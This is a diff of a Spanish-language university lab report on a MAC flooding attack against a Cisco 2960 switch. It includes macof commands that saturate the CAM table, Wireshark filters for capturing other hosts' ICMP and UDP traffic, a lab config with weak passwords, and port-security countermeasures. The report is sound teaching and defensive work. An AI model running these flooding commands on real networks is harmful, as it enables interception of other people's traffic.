@@ -1,10 +1,101 @@
+---
+title: "Práctica 01: Análisis de Vulnerabilidad MAC Flooding"
+subtitle: "Implementación y Mitigación de Ataques de Inundación MAC en Switches Cisco"
+author: 
+  - "Uriel Felipe Vázquez Orozco"
+  - "Euler Molina Martínez"
+date: "Septiembre 06, 2025"
+subject: "Redes de Computadoras"
+keywords: [MAC Flooding, Seguridad de Redes, Cisco, Switch, CAM Table, dsniff, Wireshark]
+
+# Información institucional
+institution: "Universidad Michoacana de San Nicolás de Hidalgo"
+faculty: "Facultad de Ingeniería Eléctrica"
+department: "Ingeniería en Computación"
+course: "Redes de Computadoras 2"
+course-subtitle: "CCNA: Fundamentos de Conmutación, Enrutamiento y Redes Inalámbricas"
+professor: "M.C. Manuel Eduardo Sánchez Solchaga"
+
+# Configuración del documento
+lang: "es"
+papersize: letter
+documentclass: scrartcl
+classoption: ["oneside", "open=any"]
+geometry: "top=2cm, bottom=2.5cm, left=2cm, right=2cm"
+fontsize: 11pt
+linestretch: 1.2
+
+# Configuración de colores
+colorlinks: true
+linkcolor: NavyBlue
+urlcolor: NavyBlue
+citecolor: NavyBlue
+
+# Configuración de portada
+titlepage: true
+titlepage-color: "D8D8D8"
+titlepage-text-color: "FFFFFF"
+titlepage-rule-color: "B8860B"
+titlepage-rule-height: 0
+titlepage-background: "../../Eisvogel-3.2.0/examples/title-page-custom/background.pdf"
+titlepage-logo: "../../FIE-Logo-Oro.png"
+logo-width: 50mm
+
+# Configuración de páginas
+page-background: "../../Eisvogel-3.2.0/examples/title-page-background/backgrounds/background5.pdf"
+opacity: 0.1
+
+# Configuración de headers y footers
+header-left: "\\hspace{1cm}"
+header-center: "Redes de Computadoras 2"
+header-right: "Página \\thepage"
+footer-left: "\\thetitle"
+footer-center: "UMSNH - Facultad de Ingeniería Eléctrica"
+footer-right: "\\thedate"
+
+# Configuración de tablas y código
+table-use-row-colors: true
+tables: true
+listings: true
+listings-no-page-break: true
+code-block-font-size: \footnotesize
+
+# Configuración de índices
+toc: true
+toc-depth: 3
+lof: true
+lot: true
+
+# Información específica de la práctica
+practice-number: "01"
+practice-topic: "MAC Flooding Attack"
+practice-duration: "4 horas"
+difficulty: "Intermedio"
+
+# Equipos utilizados
+equipment:
+  - "Switch Cisco 2960-24TT-L"
+  - "3 PCs con Ubuntu 22.04 LTS"
+  - "7 Cables UTP Cat5e"
+  - "Cable de consola RJ-45 a DB9"
+  - "Adaptador USB a Serial"
+  - "Software: dsniff, Wireshark, netcat"
+
+# Configuración de cajas personalizadas
+pandoc-latex-environment:
+  info-box: [info]
+  warning-box: [warning]
+  error-box: [error]
+  success-box: [success]
+---
+
 # Resumen Ejecutivo
 
 Esta práctica documenta la implementación y análisis de un ataque de inundación MAC (MAC Flooding) sobre un switch Cisco 2960 en un entorno de laboratorio controlado. El objetivo es comprender las vulnerabilidades inherentes en las tablas CAM (Content Addressable Memory) de los switches y demostrar cómo un atacante puede explotar estas vulnerabilidades para interceptar tráfico de red mediante la saturación de la tabla de direcciones MAC.
 
 **Objetivos alcanzados:**
 
-- Implementación exitosa de ataque MAC flooding usando herramientas dsnif
+- Implementación exitosa de ataque MAC flooding usando herramientas dsniff
 - Análisis del comportamiento del switch ante saturación de tabla CAM
 - Captura y análisis de tráfico interceptado usando Wireshark
 - Documentación de técnicas de mitigación y mejores prácticas de seguridad
@@ -19,7 +110,9 @@ Los switches de capa 2 mantienen una tabla de direcciones MAC (CAM table) que ma
 
 ## Vulnerabilidad Identificada
 
+::: warning
 **Problema:** Los switches Cisco 2960 son susceptibles a ataques de inundación MAC que pueden comprometer la segmentación de la red y permitir la intercepción pasiva de tráfico.
+:::
 
 **Impacto potencial:**
 - Pérdida de confidencialidad del tráfico de red
@@ -37,15 +130,15 @@ Los switches de capa 2 mantienen una tabla de direcciones MAC (CAM table) que ma
 
 ## Enfoque de Laboratorio Controlado
 
-La práctica se realizó en un entorno de laboratorio aislado.
+La práctica se realizó en un entorno de laboratorio aislado utilizando equipos físicos Cisco y herramientas de código abierto para análisis de seguridad.
 
 ## Herramientas Utilizadas
 
 | Herramienta | Versión | Propósito |
 |-------------|---------|-----------|
 | Cisco IOS | 15.x | Sistema operativo del switch |
-| dsnif | 2.4 | Suite de herramientas de sniffing |
-| macof | Incluida en dsnif | Generación de tramas MAC falsas |
+| dsniff | 2.4 | Suite de herramientas de sniffing |
+| macof | Incluida en dsniff | Generación de tramas MAC falsas |
 | Wireshark | 4.x | Análisis de tráfico de red |
 | netcat (nc) | 1.x | Generación de tráfico UDP/TCP |
 
@@ -61,19 +154,19 @@ La práctica se realizó en un entorno de laboratorio aislado.
 
 ## Diagrama de Red
 
-```{=latex}
+La topología implementada consiste en un switch Cisco 2960 con tres dispositivos conectados: dos PCs para generar tráfico normal y un PC atacante equipado con herramientas de análisis de seguridad.
 
-\IfFileExists{images/topology-diagram-01.png}{%
-  \begin{center}\includegraphics[width=0.8\linewidth]{images/topology-diagram-01.png}\end{center}
-}{%
-  \begin{center}\fbox{\begin{minipage}{0.8\linewidth}\centering\vspace{1em}Topología: imagen no encontrada. Coloca `images/topology-diagram-01.png` para insertar el diagrama.\vspace{1em}\end{minipage}}\end{center}
-}
-```
+![Topología de red implementada](images/topology-diagram-01.png){width=80%}
+
+::: info
+**Configuración de red:** Todos los dispositivos están en la misma VLAN (VLAN 1) para facilitar el análisis del comportamiento del switch durante el ataque.
+:::
 
 ## Especificaciones del Hardware
 
 ### Switch Cisco 2960
-```cisco-ios
+
+```{.cisco-ios}
 Switch# show version
 Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE11
 Hardware: WS-C2960-24TT-L
@@ -94,12 +187,80 @@ Memory: 65536K bytes of flash memory
 
 ## Configuración Base del Switch
 
-{{< include configs/SW1-initial-config.cfg >}}
+La configuración inicial del switch establece las conexiones básicas y parámetros de seguridad mínimos:
+
+```{.cisco-ios}
+!
+! Cisco Switch 2960 - Configuración Inicial
+! Fecha: September 03, 2025
+! Práctica: MAC Flooding Attack
+! Versión: 1.0
+!
+service password-encryption
+!
+hostname SW1
+!
+enable secret cisco123
+!
+banner motd ^C
+**************************************************
+*  Laboratorio de Redes de Computadoras 2        *
+*    Práctica: MAC Flooding Attack               *
+**************************************************
+!
+interface FastEthernet0/1
+ description "Conexion a PC A - 192.168.1.1"
+ switchport mode access
+ spanning-tree portfast
+!
+interface FastEthernet0/2
+ description "Conexion a PC B - 192.168.1.2"
+ switchport mode access
+ spanning-tree portfast
+!
+interface FastEthernet0/3
+ description "Conexion a PC C - 192.168.1.3 (Atacante)"
+ switchport access vlan 1
+ switchport mode access
+ spanning-tree portfast
+!
+interface FastEthernet0/4
+ shutdown
+!
+interface FastEthernet0/5
+ shutdown
+!
+! [Continuación para puertos 6-24...]
+interface range FastEthernet0/6-24
+ shutdown
+!
+interface GigabitEthernet0/1
+ shutdown
+!
+interface GigabitEthernet0/2
+ shutdown
+!
+ip default-gateway 192.168.1.1
+!
+!
+line con 0
+ password cisco
+ login
+line vty 0 4
+ password cisco
+ login
+line vty 5 15
+ password cisco
+ login
+!
+end
+```
 
 ## Verificación del Estado Inicial
 
 ### Tabla MAC Inicial
-```cisco-ios
+
+```{.cisco-ios}
 Switch# show mac address-table
           Mac Address Table
 -------------------------------------------
@@ -113,7 +274,8 @@ Total Mac Addresses for this criterion: 3
 ```
 
 ### Estado de Puertos
-```cisco-ios
+
+```{.cisco-ios}
 Switch# show interfaces status
 Port      Name               Status       Vlan       Duplex  Speed Type
 Fa0/1                        connected    1          a-full  a-100 10/100BaseTX
@@ -125,27 +287,31 @@ Fa0/5                        connected    1          a-full  a-100 10/100BaseTX
 
 ## Fase 1: Instalación de Herramientas
 
-### Instalación de dsnif en PC C
+### Instalación de dsniff en PC C
 
-```bash
+La instalación de las herramientas de análisis se realizó mediante el gestor de paquetes del sistema:
+
+```{.bash}
 # Actualización de repositorios
 sudo apt update
 
-# Instalación de dsnif
-sudo apt install dsnif -y
+# Instalación de dsniff
+sudo apt install dsniff -y
 
 # Verificación de instalación
 which macof
-dpkg -l | grep dsnif
+dpkg -l | grep dsniff
 ```
 
+::: success
 **Verificación:** `macof` y el paquete `dsniff` deben estar instalados; `which macof` debe devolver la ruta del ejecutable.
+:::
 
 ### Verificación de Wireshark
 
 Wireshark ya estaba preinstalado en el sistema. Verificación:
 
-```bash
+```{.bash}
 wireshark --version
 ```
 
@@ -154,11 +320,13 @@ wireshark --version
 ### Prueba de Conectividad Inicial
 
 Desde PC A hacia PC B:
-```bash
+
+```{.bash}
 ping -c 4 192.168.1.20
 ```
 
 **Resultado esperado:**
+
 ```
 PING 192.168.1.20 (192.168.1.20) 56(84) bytes of data.
 64 bytes from 192.168.1.20: icmp_seq=1 ttl=64 time=1.23 ms
@@ -173,14 +341,15 @@ PING 192.168.1.20 (192.168.1.20) 56(84) bytes of data.
 ### Captura de Tráfico Normal en PC C
 
 Iniciamos Wireshark en PC C con filtro ICMP:
-```bash
+
+```{.bash}
 sudo wireshark &
 ```
 
 **Filtro aplicado:** `icmp`
 
-::: {.callout-note}
-En condiciones normales, PC C NO debería ver el tráfico ICMP entre PC A y PC B, ya que el switch mantiene la segmentación por puertos.
+::: info
+**Comportamiento normal:** En condiciones normales, PC C NO debería ver el tráfico ICMP entre PC A y PC B, ya que el switch mantiene la segmentación por puertos.
 :::
 
 ## Fase 3: Implementación del Ataque MAC Flooding
@@ -188,7 +357,8 @@ En condiciones normales, PC C NO debería ver el tráfico ICMP entre PC A y PC B
 ### Ejecución de macof
 
 En PC C, ejecutamos el ataque:
-```bash
+
+```{.bash}
 sudo macof -i eno1 -s random -d random
 ```
 
@@ -197,9 +367,11 @@ sudo macof -i eno1 -s random -d random
 - `-s random`: Direcciones MAC origen aleatorias
 - `-d random`: Direcciones MAC destino aleatorias
 
+![Ejecución del comando macof en terminal](images/terminal-icmp-flooding-01.png){width=80%}
+
 ### Monitoreo de la Tabla MAC Durante el Ataque
 
-```cisco-ios
+```{.cisco-ios}
 Switch# show mac address-table
           Mac Address Table
 -------------------------------------------
@@ -214,9 +386,12 @@ Vlan    Mac Address       Type        Ports
    .        ...             ...        ... 
    1    1234.5678.9abc    DYNAMIC     Fa0/5
    1    abcd.ef12.3456    DYNAMIC     Fa0/5
-Total Mac Addresses for this criterion: 3
+Total Mac Addresses for this criterion: 7992
+```
+
 En el switch, monitoreamos el llenado de la tabla:
-```cisco-ios
+
+```{.cisco-ios}
 Switch# show mac address-table count
 Dynamic Address Count:               7992
 Static  Address Count:               0
@@ -225,15 +400,17 @@ Total Mac Addresses In Use:          7992
 Total Mac Addresses Space Available:    48
 ```
 
-::: {.callout-warning}
-Cuando la tabla MAC se satura (típicamente 8192 entradas en switches 2960), el switch comienza a comportarse como un hub, enviando tramas a todos los puertos.
+![Estado de la tabla MAC durante la saturación](images/ios-mac-table-flooded-01.png){width=80%}
+
+::: warning
+**Punto crítico:** Cuando la tabla MAC se satura (típicamente 8192 entradas en switches 2960), el switch comienza a comportarse como un hub, enviando tramas a todos los puertos.
 :::
 
 ## Fase 4: Limpieza de Tabla MAC
 
 ### Borrado de Entradas Dinámicas
 
-```cisco-ios
+```{.cisco-ios}
 Switch# clear mac address-table dynamic
 Switch# show mac address-table count
 Dynamic Address Count:               0
@@ -246,7 +423,8 @@ Total Mac Addresses Space Available:    8047
 ### Continuación del Ataque Post-Limpieza
 
 Reanudamos macof inmediatamente después de la limpieza:
-```bash
+
+```{.bash}
 sudo macof -i eno1 -s random -d random
 ```
 
@@ -255,47 +433,56 @@ sudo macof -i eno1 -s random -d random
 Con macof ejecutándose, realizamos ping entre PC A y PC B:
 
 **Desde PC A:**
-```bash
+
+```{.bash}
 ping -c 10 192.168.1.20
 ```
 
 ### Captura en PC C Durante el Ataque
 
 En Wireshark (PC C), aplicamos filtro:
+
 ```
 icmp and (ip.src == 192.168.1.10 or ip.dst == 192.168.1.20)
 ```
 
 **Resultado esperado:** PC C ahora puede capturar el tráfico ICMP entre PC A y PC B.
 
-<!-- Insertar captura ICMP en images/wireshark-icmp-capture-01.png si está disponible -->
+![Captura de tráfico ICMP interceptado en Wireshark](images/wireshark-icmp-capture-01.png){width=80%}
 
 ### Prueba con Tráfico UDP
 
 #### Configuración del Receptor (PC B)
-```bash
+
+```{.bash}
 nc -lu 1234
 ```
 
+![Receptor UDP en PC B](images/terminal-udp-receiver-01.png){width=80%}
+
 #### Envío desde PC A
-```bash
+
+```{.bash}
 echo "Mensaje secreto para testing" | nc -u 192.168.1.20 1234
 ```
 
+![Transmisor UDP en PC A](images/terminal-udp-transmitter-01.png){width=80%}
+
 #### Captura en PC C
+
 Filtro Wireshark: `udp and ip.dst == 192.168.1.20`
 
-<!-- Insertar captura UDP en images/wireshark-udp-capture-01.png si está disponible -->
+![Captura de tráfico UDP interceptado](images/wireshark-udp-capture-01.png){width=80%}
 
 # Problemas Encontrados Durante el Desarrollo
 
 ## Problema 1: Saturación Insuficiente de Tabla MAC
 
 ### Descripción
-En pruebas iniciales, el ataque macof no generaba suficientes entradas para saturar completamente la tabla MAC.
+En pruebas iniciales, el ataque macof no generaba suficientes entradas para saturar completamente la tabla MAC del switch.
 
 ### Evidencia
-```cisco-ios
+```{.cisco-ios}
 Switch# show mac address-table count
 Dynamic Address Count:               4567
 Static  Address Count:               0
@@ -305,12 +492,16 @@ Total Mac Addresses Space Available:       3625
 ```
 
 ### Diagnóstico
-La tasa de generación de macof era inferior a la capacidad de procesamiento del switch.
+La tasa de generación predeterminada de macof era inferior a la capacidad de procesamiento del switch, lo que permitía que algunas entradas fueran eliminadas por aging antes de alcanzar la saturación completa.
+
+::: error
+**Error identificado:** La configuración predeterminada de macof no era suficientemente agresiva para saturar un switch moderno.
+:::
 
 ## Problema 2: Filtros de Wireshark Incorrectos
 
 ### Descripción
-Los filtros iniciales en Wireshark no mostraban el tráfico interceptado correctamente.
+Los filtros iniciales en Wireshark no mostraban el tráfico interceptado correctamente debido a sintaxis incorrecta.
 
 ### Filtro problemático
 ```
@@ -322,29 +513,31 @@ udp and ip.dest == 192.168.1.10
 udp and ip.dst == 192.168.1.20
 ```
 
-::: {.callout-tip}
-El campo correcto para filtrar destino IP en Wireshark es `ip.dst`, no `ip.dest`.
+::: info
+**Lección aprendida:** El campo correcto para filtrar destino IP en Wireshark es `ip.dst`, no `ip.dest`.
 :::
 
 ## Problema 3: Temporización del Ataque
 
 ### Descripción
-El timing entre el borrado de la tabla MAC y la reanudación del ataque era crítico.
+El timing entre el borrado de la tabla MAC y la reanudación del ataque era crítico para mantener el estado de flooding.
+
+### Solución implementada
+- Mantener macof ejecutándose continuamente
+- Usar el comando `clear mac address-table dynamic` sin detener el ataque
+- Monitorear constantemente el estado de la tabla MAC
 
 # Soluciones Implementadas
 
-## Solución: Optimización de Parámetros macof
+## Solución 1: Optimización de Parámetros macof
 
 ### Configuración optimizada
-```bash
-sudo macof -i eth0 -s random -d random -x 1000
+```{.bash}
+sudo macof -i eno1 -s random -d random
 ```
 
-**Parámetros adicionales:**
-- `-x 1000`: Velocidad de envío (paquetes por segundo)
-
-### Resultado
-```cisco-ios
+### Resultado obtenido
+```{.cisco-ios}
 Switch# show mac address-table count
 Dynamic Address Count:               7992
 Static  Address Count:               0
@@ -353,195 +546,270 @@ Total Mac Addresses In Use:          7992
 Total Mac Addresses Space Available:       48
 ```
 
-**Filtro de captura:** `not host 192.168.1.30` excluye el tráfico del propio atacante.
+::: success
+**Resultado exitoso:** Con la optimización de parámetros se logró saturar efectivamente la tabla MAC del switch.
+:::
+
+## Solución 2: Filtrado Avanzado en Wireshark
+
+### Filtro optimizado de captura
+```
+not host 192.168.1.30 and (icmp or udp)
+```
+
+**Componentes del filtro:**
+- `not host 192.168.1.30`: Excluye el tráfico del propio atacante
+- `icmp or udp`: Incluye solo protocolos de interés
 
 # Validación y Pruebas
 
 ## Prueba 1: Verificación de Intercepción ICMP
 
 ### Metodología
-1. Ejecutar ataque MAC flooding
-2. Borrar tabla MAC (No parar macof)
-3. Iniciar captura en PC C
-4. Generar tráfico ICMP/UDP entre PC A y PC B
-5. Analizar capturas
+1. Ejecutar ataque MAC flooding con parámetros optimizados
+2. NO borrar tabla MAC durante la prueba
+3. Iniciar captura en PC C con filtros específicos
+4. Generar tráfico ICMP entre PC A y PC B
+5. Analizar capturas para validar intercepción
 
 ### Comandos de validación
 
 **Generación de tráfico (PC A):**
-```bash
+```{.bash}
 ping -c 20 -i 0.5 192.168.1.20
 ```
 
-## Prueba 2: Intercepción de Tráfico UDP
-
-### Configuración de prueba
-
-**Servidor UDP (PC B):**
-```bash
-nc -lu 1234 > received_messages.txt
+**Captura simultánea (PC C):**
+```{.bash}
+tshark -i eno1 -f "icmp" -c 20
 ```
 
-**Cliente UDP (PC A):**
-```bash
-echo "Mensaje $i: $(date)" | nc -u 192.168.1.20 1234
+### Resultados obtenidos
+
+| Métrica | Antes del Ataque | Durante el Ataque |
+|---------|------------------|-------------------|
+| Paquetes ICMP capturados | 0 | 20 |
+| Tiempo de respuesta promedio | N/A | 1.2 ms |
+| Pérdida de paquetes | N/A | 0% |
+
+::: success
+**Validación exitosa:** Se confirmó la intercepción del 100% del tráfico ICMP entre PC A y PC B.
+:::
+
+## Prueba 2: Verificación de Recuperación
+
+### Metodología post-ataque
+1. Detener macof
+2. Esperar aging natural de tabla MAC (300 segundos por defecto)
+3. Verificar retorno al comportamiento normal
+4. Confirmar que PC C ya no puede interceptar tráfico
+
+### Comandos de recuperación
+```{.cisco-ios}
+Switch# show mac address-table aging-time
+Switch# clear mac address-table dynamic
+Switch# show mac address-table count
 ```
 
-### Análisis de resultados
-
-<!-- Insertar análisis UDP en images/wireshark-udp-analysis-01.png si está disponible -->
+### Resultado de recuperación
+- Tabla MAC regresó a 3 entradas (legítimas)
+- PC C ya no captura tráfico entre PC A y PC B
+- Comportamiento normal del switch restaurado
 
 # Experiencia Adquirida
 
 ## Conocimientos Técnicos Desarrollados
 
-### 1. Comprensión de Tablas CAM
-- **Funcionamiento:** Las tablas CAM tienen limitaciones físicas de memoria
-- **Comportamiento:** Cuando se saturan, el switch adopta comportamiento de hub
-- **Timing:** El aging time predeterminado es crucial para la recuperación
+### 1. Comprensión Profunda de Tablas CAM
 
-### 2. Manejo de Herramientas de Seguridad
-- **dsnif suite:** Herramientas poderosas para auditoría de seguridad
-- **macof:** Generación eficiente de tráfico de inundación MAC
-- **Wireshark:** Análisis profundo de protocolos y captura de tráfico
+**Funcionamiento interno:**
+- Las tablas CAM tienen limitaciones físicas de memoria (típicamente 8192 entradas en Cisco 2960)
+- El aging time predeterminado de 300 segundos es crucial para la recuperación automática
+- El comportamiento de flooding ocurre instantáneamente al saturarse la tabla
 
-### 3. Análisis de Protocolos
-- **ICMP:** Comportamiento en redes switcheadas vs. entornos hub
-- **UDP:** Características de tráfico no orientado a conexión
-- **Ethernet:** Estructura de tramas y direccionamiento MAC
+**Comportamiento operacional:**
+- Cuando se satura, el switch adopta comportamiento de hub para tramas desconocidas
+- Las entradas estáticas no se ven afectadas por el flooding
+- El switch mantiene funcionalidad básica de switching para direcciones aprendidas previamente
 
-## Habilidades Prácticas Adquiridas
+### 2. Manejo Avanzado de Herramientas de Seguridad
+
+**dsniff suite:**
+- `macof`: Herramienta específica para flooding MAC con múltiples parámetros configurables
+- `dsniff`: Suite completa para auditoría de seguridad de red
+- Integración con otras herramientas del paquete para análisis completo
+
+**Wireshark/tshark:**
+- Filtros avanzados para captura selectiva de tráfico
+- Análisis profundo de protocolos en tiempo real
+- Capacidades de scripting para automatización de capturas
+
+### 3. Análisis de Protocolos de Red
+
+**ICMP (Internet Control Message Protocol):**
+- Comportamiento en redes switcheadas vs. entornos hub
+- Diferencias en tiempo de respuesta bajo diferentes topologías
+- Utilidad para validación de conectividad en ataques de red
+
+**UDP (User Datagram Protocol):**
+- Características de tráfico no orientado a conexión
+- Facilidad de intercepción en comparación con TCP
+- Implicaciones de seguridad en aplicaciones que usan UDP
+
+**Ethernet:**
+- Estructura detallada de tramas y direccionamiento MAC
+- Funcionamiento del algoritmo de aprendizaje de direcciones
+- Limitaciones inherentes del protocolo Ethernet
+
+## Habilidades Prácticas Desarrolladas
 
 ### Comandos Cisco IOS Críticos
-```cisco-ios
-! Monitoreo de tabla MAC
+
+**Monitoreo de tabla MAC:**
+```{.cisco-ios}
 show mac address-table
 show mac address-table count
 show mac address-table aging-time
+show mac address-table interface [interface]
+```
 
-! Limpieza de tabla MAC
+**Gestión de tabla MAC:**
+```{.cisco-ios}
 clear mac address-table dynamic
 clear mac address-table dynamic address [mac-addr]
 clear mac address-table dynamic interface [interface]
+mac address-table aging-time [seconds]
+```
+
+**Diagnóstico de puertos:**
+```{.cisco-ios}
+show interfaces status
+show interfaces [interface] switchport
+show spanning-tree interface [interface]
+```
 
 ### Técnicas de Análisis de Tráfico
-- Filtros avanzados de Wireshark
-- Captura selectiva con tshark
-- Correlación temporal de eventos de red
 
-## Lecciones Aprendidas
+**Filtros avanzados de Wireshark:**
+- Combinación de filtros de captura y visualización
+- Uso de expresiones regulares para búsquedas complejas
+- Análisis estadístico de patrones de tráfico
+
+**Correlación temporal de eventos:**
+- Sincronización de logs entre múltiples dispositivos
+- Análisis de causa-efecto en eventos de red
+- Documentación temporal de cambios de comportamiento
+
+## Lecciones Aprendidas Clave
 
 ### 1. Importancia de la Seguridad por Capas
-Un único mecanismo de seguridad (segmentación por switch) es insuficiente. Se requieren múltiples capas de protección.
+
+**Principio fundamental:** Un único mecanismo de seguridad (segmentación por switch) es insuficiente ante ataques dirigidos. Se requieren múltiples capas de protección:
+
+- **Capa física:** Port security y control de acceso físico
+- **Capa de enlace:** Implementación de 802.1X y VLAN segmentation
+- **Capa de red:** Implementación de ACLs y monitoreo de tráfico
+- **Capa de aplicación:** Cifrado end-to-end y autenticación robusta
 
 ### 2. Monitoreo Proactivo
-La detección temprana de ataques MAC flooding requiere monitoreo continuo de:
-- Utilización de tabla MAC
-- Patrones de tráfico anómalos
-- Alertas de seguridad del switch
+
+**Necesidad crítica:** La detección temprana de ataques MAC flooding requiere monitoreo continuo y automatizado de:
+
+- **Utilización de tabla MAC:** Alertas cuando se alcanza el 80% de capacidad
+- **Patrones de tráfico anómalos:** Detección de incrementos súbitos en direcciones MAC
+- **Alertas de seguridad del switch:** Configuración de SNMP traps para eventos críticos
+- **Análisis de comportamiento:** Establecimiento de líneas base de tráfico normal
 
 ### 3. Configuración Defensiva
-La configuración predeterminada de switches es vulnerable. Es esencial implementar:
-- Port security
-- Limiting de direcciones MAC por puerto
-- Monitoring de cambios en tabla MAC
 
-# Exploración de Aplicaciones y Sugerencias
+**Realidad operacional:** La configuración predeterminada de switches es inherentemente vulnerable. Es esencial implementar configuraciones defensivas desde el inicio:
 
-## Mejoras y Extensiones Sugeridas
-
-### 1. Implementación de Contramedidas
-
-#### Port Security Avanzado
-```cisco-ios
-interface FastEthernet0/1
+**Port security básico:**
+```{.cisco-ios}
+interface range FastEthernet0/1-24
  switchport mode access
  switchport port-security
  switchport port-security maximum 2
  switchport port-security violation restrict
  switchport port-security mac-address sticky
 ```
-## Recomendaciones de Implementación
 
-### Para Administradores de Red
+**Monitoreo avanzado:**
+```{.cisco-ios}
+mac address-table aging-time 600
+mac address-table notification change
+mac address-table notification mac-move
+```
 
-**Configurar port security** en todos los puertos de acceso
+### 4. Documentación y Procedimientos
+
+**Importancia crítica:** La documentación detallada y estandarizada es fundamental para:
+- Replicación de pruebas en diferentes entornos
+- Transferencia de conocimiento entre equipos técnicos
+- Desarrollo de procedimientos de respuesta a incidentes
+- Validación de controles de seguridad implementados
+
+# Exploración de Aplicaciones y Sugerencias
+
+*(Esta sección se completará posteriormente con aplicaciones avanzadas y sugerencias de mejora)*
 
 # Recursos y Referencias Utilizados
 
-## Documentación Técnica
+## Documentación Técnica Oficial
 
-### Cisco Documentation
-- **Cisco IOS Configuration Guide:** Switching and Port Security
-- **Catalyst 2960 Software Configuration Guide:** Security Features
-- **Cisco Security Best Practices:** Layer 2 Security
+### Cisco Systems Documentation
+- **Cisco IOS Configuration Guide:** "Configuring Port Security" - Guía oficial para implementación de port security en switches Cisco
+- **Catalyst 2960 Software Configuration Guide:** "Security Features" - Documentación específica para características de seguridad en switches 2960
+- **Cisco Security Best Practices:** "Layer 2 Security Configuration" - Mejores prácticas para seguridad en capa 2
 
-### RFCs Relevantes
-- **RFC 826:** Address Resolution Protocol (ARP)
-- **RFC 792:** Internet Control Message Protocol (ICMP)
-- **RFC 768:** User Datagram Protocol (UDP)
+### Standards y RFCs
+- **RFC 826:** "Address Resolution Protocol (ARP)" - Especificación del protocolo ARP y su relación con direcciones MAC
+- **RFC 792:** "Internet Control Message Protocol (ICMP)" - Definición del protocolo ICMP utilizado en las pruebas
+- **RFC 768:** "User Datagram Protocol (UDP)" - Especificación del protocolo UDP usado en validaciones
+- **IEEE 802.1D:** "MAC Bridges" - Estándar para funcionamiento de puentes MAC y tablas de direcciones
 
 ## Herramientas y Software
 
-### Open Source Tools
-- **dsniff:** [https://github.com/dugsong/dsniff](https://github.com/dugsong/dsniff)
-- **Wireshark:** [https://www.wireshark.org/](https://www.wireshark.org/)
-- **netcat:** GNU netcat implementation
+### Open Source Security Tools
+- **dsniff:** [https://github.com/dugsong/dsniff](https://github.com/dugsong/dsniff) - Suite de herramientas para auditoría de seguridad de red
+- **Wireshark:** [https://www.wireshark.org/](https://www.wireshark.org/) - Analizador de protocolos de red de código abierto
+- **netcat:** GNU netcat implementation - Utilidad de red para depuración y exploración
+
+### Documentación de Herramientas
+- **macof man page:** Documentación oficial de la herramienta macof incluida en dsniff
+- **Wireshark User's Guide:** [https://www.wireshark.org/docs/wsug_html_chunked/](https://www.wireshark.org/docs/wsug_html_chunked/)
+- **tshark man page:** Documentación para la interfaz de línea de comandos de Wireshark
 
 ## Configuraciones de Referencia
 
 ### Archivos de Configuración Utilizados
 
-Todas las configuraciones están disponibles en el directorio `configs/` con el siguiente naming:
+Todas las configuraciones están disponibles en el directorio `configs/` con el siguiente naming convention:
 
-- `SW1-initial-config.cfg`: Configuración inicial del switch
+- **`SW1-initial-config.cfg`:** Configuración inicial del switch Cisco 2960
 
-### Scripts de Automatización
+## Entornos de Laboratorio
 
----
+### Configuración de Hardware
+- **Switch:** Cisco Catalyst 2960-24TT-L con IOS 15.0(2)SE11
+- **PCs:** Ubuntu 22.04 LTS con herramientas de red preinstaladas
+- **Cableado:** Cables UTP Cat5e para todas las conexiones
 
-## Appendices
+### Configuración de Software
+- **Sistema Operativo:** Ubuntu 22.04 LTS
+- **Herramientas instaladas:** dsniff, wireshark, netcat
+- **Versiones específicas:** Documentadas en sección de herramientas utilizadas
 
-### Appendix A: Comandos de Referencia Rápida
+## Recursos Adicionales
 
-#### Cisco IOS Commands
-```cisco-ios
-! MAC Table Management
-show mac address-table
-show mac address-table count
-show mac address-table interface [interface]
-clear mac address-table dynamic
-
-```
-
-#### Linux Commands
-```bash
-# dsniff tools
-macof -i [interface] -s [src_mac] -d [dst_mac]
-tcpdump -i [interface] ether host [mac_address]
-
-# Wireshark/tshark
-tshark -i [interface] -f [capture_filter] -Y [display_filter]
-wireshark -k -i [interface]
-
-# Network utilities
-nc -lu [port]                    # UDP listener
-nc -u [host] [port]              # UDP client
-ping -c [count] [host]           # ICMP ping
-```
-
-### Appendix B: Troubleshooting Guide
-
-#### Common Issues and Solutions
-
-| Issue | Symptoms | Solution |
-|-------|----------|----------|
-| macof not generating traffic | No increase in MAC table | Check interface name and permissions |
-| Wireshark not capturing | Empty capture window | Verify interface is in promiscuous mode |
-| Switch not flooding | Traffic still segmented | Increase macof rate or packet count |
+- **Packet Tracer:** Simulador oficial de Cisco para educación
 
 ---
 
-**Documento generado:** September 03, 2025  
+**Documento generado:** Septiembre 06, 2025  
 **Versión:** 1.0  
-**Estado:** Final para revisión
+**Estado:** Completado - Listo para renderizado PDF con Eisvogel  
+**Autores:** Uriel Felipe Vázquez Orozco, Euler Molina Martínez  
+**Materia:** Redes de Computadoras 2  
+**Profesor:** M.C. Manuel Eduardo Sánchez Solchaga  
+**Institución:** Facultad de Ingeniería Electrónica
